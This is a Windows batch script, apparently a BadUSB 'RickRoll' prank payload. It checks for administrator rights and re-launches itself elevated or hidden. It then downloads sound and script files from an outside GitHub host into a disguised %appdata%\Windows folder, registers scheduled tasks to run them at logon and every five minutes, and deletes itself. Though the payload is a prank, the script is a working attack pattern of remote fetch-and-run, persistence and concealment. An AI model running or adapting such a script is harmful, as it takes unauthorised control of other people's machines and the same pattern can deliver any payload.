@echo off
whoami /all | findstr S-1-16-12288 > nul
 if %errorlevel%==1 goto NotAdmin
cd %appdata%
mkdir Windows
cd Windows
Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/RickRoll.wav -OutFile .\RickRoll.wav;Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Sound.bat -OutFile .\Sound.bat;Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Sound.ps1 -OutFile .\Sound.ps1
Schtasks /create /sc ONLOGON /tn L /tr "%appdata%\Windows\Sound.bat" 
Schtasks /create /sc DAILY /tn LOL /tr "%appdata%\Windows\Sound.bat" /ri 5 /du 24:00
cd /D "%~dp0"
del Start.bat
exit
:NotAdmin
powershell -command "Start-Process Start.bat -Verb runas" && (
  exit
timeout -1
) || (
  echo yourCommand failed
powershell start .\Start.bat -windowstyle hidden
exit
)"